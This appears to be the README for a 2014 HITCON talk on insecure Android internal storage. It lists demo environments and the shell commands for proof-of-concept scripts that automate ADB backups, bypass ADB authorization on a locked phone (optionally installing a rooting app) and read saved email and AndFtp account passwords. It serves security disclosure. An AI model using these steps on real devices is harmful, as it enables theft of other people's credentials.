# What's this?
Here're slides and PoC code for the presentation "Insecure Internal Storage in Android" at HITCON 2014 in Taipei.

# Demos
## Demo 1: Automatically run ADB backup
### Environment
Nexus 4, Android 4.3, locked, ADB enabled, ADB authed.

### Steps
$ ./backup.py com.google.android.email

$ ./extract.py

## Demo 2: Bypass ADB auth
### Environment
Nexus 5, Android 4.4.2, locked, ADB enabled.

ADB NOT authed.

Internet connected.

### Steps
$ adb shell

Slide to camera.

$ adb kill-server

$ adb shell

Click screen.

**(Optional)**

$ adb install tr-mod_signed.apk

$ adb shell am start -n com.geohot.towelroot/.TowelRoot -a android.intent.action.MAIN -c android.intent.category.LAUNCHER

$ adb shell

## Demo 3: Read Email account password
### Environment
Nexus 4, Android 4.3, locked, ADB enabled, ADB authed.

Email logined.

### Steps
$ ./backup.py com.google.android.email

$ ./extract.py

$ ./read_email_account.py

## Demo 4: Read AndrFtp account password
### Environment
Nexus 4, Android 4.3, locked, ADB enabled, ADB authed.

An account is saved in AndFtp

### Steps
$ javac AndFtpDecryptor.java

$ ./backup.py lysesoft.andftp

$ ./extract.py

$ ./read_andftp_account.py

